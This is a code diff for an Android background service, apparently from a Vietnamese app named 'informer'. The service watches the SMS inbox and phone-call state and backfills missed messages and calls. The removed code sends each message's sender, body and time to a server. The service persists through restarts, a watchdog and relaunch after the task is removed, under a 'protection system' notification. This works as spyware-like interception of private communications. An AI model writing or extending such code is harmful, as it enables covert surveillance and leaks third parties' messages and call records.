@@ -3,8 +3,10 @@ package com.example.informer
 import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.app.Service
+import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
+import android.content.IntentFilter
 import android.content.pm.ServiceInfo
 import android.database.ContentObserver
 import android.net.Uri
@@ -13,127 +15,92 @@ import android.os.Handler
 import android.os.IBinder
 import android.os.Looper
 import android.util.Log
+import android.telephony.TelephonyManager
 import androidx.core.app.NotificationCompat
+import androidx.core.content.ContextCompat
+import java.util.concurrent.Executors
 
 class BackgroundMonitoringService : Service() {
 
     private lateinit var smsObserver: ContentObserver
-    
-    private val safeContext by lazy {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) createDeviceProtectedStorageContext() else this
-    }
-    
-    private val prefs by lazy {
-        safeContext.getSharedPreferences("AppInternalStateV4", Context.MODE_PRIVATE)
-    }
-
-    private var lastProcessedSmsDate: Long
-        get() = prefs.getLong("last_processed_sms_date", 0L)
-        set(value) {
-            prefs.edit().putLong("last_processed_sms_date", value).commit()
-        }
+    private lateinit var phoneStateReceiver: BroadcastReceiver
+    private val backgroundExecutor = Executors.newSingleThreadExecutor()
+    private var phoneReceiverRegistered = false
 
     override fun onCreate() {
         super.onCreate()
-        if (lastProcessedSmsDate == 0L) {
-            lastProcessedSmsDate = getMaxSmsDateInInbox()
-        }
+        Log.d("SERVICE", "BackgroundMonitoringService.onCreate()")
         startForegroundNow()
-        registerSmsObserver()
-    }
-
-    private fun getMaxSmsDateInInbox(): Long {
-        return try {
-            val cursor = contentResolver.query(
-                Uri.parse("content://sms/inbox"),
-                arrayOf("date"), null, null, "date DESC LIMIT 1"
-            )
-            cursor?.use { if (it.moveToFirst()) it.getLong(0) else System.currentTimeMillis() } ?: System.currentTimeMillis()
-        } catch (e: Exception) { System.currentTimeMillis() }
+        
+        // Luon lap lich Watchdog khi khoi tao
+        ServiceWatchdog.schedule(applicationContext, "service-onCreate")
+        
+        HistoryScanBaseline.ensureInitialized(applicationContext)
+        registerPhoneStateReceiver()
+        
+        if (hasReadSmsPermission()) {
+            registerSmsObserver()
+        }
+        
+        // Quet bu du lieu ngay khi vao
+        triggerBackfill("SERVICE_START")
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
+        Log.d("SERVICE", "BackgroundMonitoringService.onStartCommand()")
         startForegroundNow()
         return START_STICKY
     }
 
     override fun onDestroy() {
+        Log.d("SERVICE", "BackgroundMonitoringService.onDestroy()")
         try { contentResolver.unregisterContentObserver(smsObserver) } catch (e: Exception) {}
+        if (phoneReceiverRegistered) {
+            try { unregisterReceiver(phoneStateReceiver) } catch (e: Exception) {}
+            phoneReceiverRegistered = false
+        }
+        backgroundExecutor.shutdownNow()
         super.onDestroy()
     }
 
     override fun onTaskRemoved(rootIntent: Intent?) {
         super.onTaskRemoved(rootIntent)
-        val restartIntent = Intent(applicationContext, BackgroundMonitoringService::class.java)
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(restartIntent)
-        else startService(restartIntent)
+        AppLifecycleManager.restoreIfActivated(applicationContext, "task_removed")
     }
 
     override fun onBind(intent: Intent?): IBinder? = null
 
+    private fun registerPhoneStateReceiver() {
+        if (phoneReceiverRegistered) return
+        phoneStateReceiver = object : BroadcastReceiver() {
+            override fun onReceive(context: Context, intent: Intent) {
+                val pendingResult = goAsync()
+                CallEventHandler.handleIncomingCall(context, intent, "SERVICE", pendingResult)
+            }
+        }
+        val filter = IntentFilter(TelephonyManager.ACTION_PHONE_STATE_CHANGED)
+        ContextCompat.registerReceiver(this, phoneStateReceiver, filter, ContextCompat.RECEIVER_EXPORTED)
+        phoneReceiverRegistered = true
+    }
+
     private fun registerSmsObserver() {
         smsObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
             override fun onChange(selfChange: Boolean) {
-                readNewSms()
+                backgroundExecutor.execute { SmsInboxSync.pollMissingSms(applicationContext, "OBSERVER") }
             }
         }
         contentResolver.registerContentObserver(Uri.parse("content://sms/inbox"), true, smsObserver)
     }
 
-    private fun readNewSms() {
-        kotlin.concurrent.thread {
-            try {
-                // Đợi 2500ms để Receiver có cơ hội xử lý trước ổn định
-                Thread.sleep(2500)
-                
-                val cursor = contentResolver.query(
-                    Uri.parse("content://sms/inbox"),
-                    arrayOf("address", "body", "date", "_id"),
-                    "date > ?",
-                    arrayOf(lastProcessedSmsDate.toString()),
-                    "date ASC"
-                )
-
-                cursor?.use {
-                    while (it.moveToNext()) {
-                        val rawNumber = it.getString(0) ?: continue
-                        val body      = it.getString(1) ?: continue
-                        val date      = it.getLong(2)
-                        val smsId     = it.getString(3) ?: ""
-
-                        if (date <= lastProcessedSmsDate) continue
-                        
-                        val msgKey = "ID_$smsId"
-                        if (prefs.contains(msgKey)) {
-                            lastProcessedSmsDate = date
-                            continue
-                        }
-
-                        val number = PhoneUtils.formatVietnamesePhoneNumber(rawNumber)
-                        val cleanBody = body.replace("\\s".toRegex(), "")
-                        val tsSec = date / 1000
-                        val fuzzyKey = "KEY_${number}_${cleanBody}_$tsSec"
-                        val fuzzyKeyPrev = "KEY_${number}_${cleanBody}_${tsSec - 1}"
-                        
-                        if (prefs.contains(fuzzyKey) || prefs.contains(fuzzyKeyPrev)) {
-                            prefs.edit().putBoolean(msgKey, true).commit()
-                            lastProcessedSmsDate = date
-                            continue
-                        }
-
-                        // Ghi nhật ký và gửi bù
-                        prefs.edit().putBoolean(msgKey, true).commit()
-                        lastProcessedSmsDate = date
-                        
-                        val name = PhoneUtils.getDisplayName(applicationContext, number)
-                        Log.d("SERVICE", "📩 [BACKUP] Gửi tin sót ID: $smsId")
-                        ServerReporter.sendEventSync(applicationContext, "SMS", name, body, date)
-                    }
-                }
-            } catch (e: Exception) {
-                Log.e("SERVICE", "Lỗi: ${e.message}")
-            }
+    private fun triggerBackfill(source: String) {
+        backgroundExecutor.execute { 
+            SmsInboxSync.pollMissingSms(applicationContext, source)
+            CallLogSync.pollMissingCalls(applicationContext, source)
         }
+    }
+
+    private fun hasReadSmsPermission(): Boolean {
+        return ContextCompat.checkSelfPermission(this, android.Manifest.permission.READ_SMS) == android.content.pm.PackageManager.PERMISSION_GRANTED
     }
 
     private fun startForegroundNow() {
@@ -141,14 +108,14 @@ class BackgroundMonitoringService : Service() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val manager = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
             if (manager.getNotificationChannel(channelId) == null) {
-                manager.createNotificationChannel(NotificationChannel(channelId, "Hệ thống bảo vệ", NotificationManager.IMPORTANCE_LOW))
+                manager.createNotificationChannel(NotificationChannel(channelId, "He thong bao ve", NotificationManager.IMPORTANCE_LOW))
             }
         }
         val notification = NotificationCompat.Builder(this, channelId)
             .setOngoing(true)
             .setSmallIcon(android.R.drawable.ic_lock_idle_lock)
-            .setContentTitle("Hệ thống bảo vệ đang chạy")
-            .setContentText("Đang giám sát thiết bị...")
+            .setContentTitle("He thong dang chay")
+            .setContentText("Dang giam sat tin nhan va cuoc goi.")
             .build()
         try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) 
@@ -156,6 +123,8 @@ class BackgroundMonitoringService : Service() {
             else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) 
                 startForeground(101, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
             else startForeground(101, notification)
-        } catch (e: Exception) {}
+        } catch (e: Exception) {
+            Log.e("SERVICE", "Error startForeground: " + e.message)
+        }
     }
 }
